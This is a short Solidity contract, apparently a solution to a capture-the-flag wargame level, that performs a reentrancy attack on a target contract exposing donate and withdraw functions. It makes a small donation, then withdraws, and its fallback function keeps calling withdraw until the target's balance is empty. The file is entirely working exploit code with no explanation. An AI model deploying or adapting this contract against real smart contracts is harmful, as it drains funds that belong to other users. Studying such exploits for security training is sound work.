// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract HackReentrance {
  IReentrance public reentranceAddress;
  uint public amountToWithdraw = 1 szabo;

  constructor(IReentrance _reentranceAddress) public payable {
    reentranceAddress = IReentrance(_reentranceAddress);
  }

  function becomeDonor() public {
    reentranceAddress.donate.value(amountToWithdraw).gas(4000000)(address(this));
    reentranceAddress.withdraw(amountToWithdraw);
  }

  fallback() external payable {
    if(address(reentranceAddress).balance != 0){
      reentranceAddress.withdraw(amountToWithdraw);
    }
  }
}
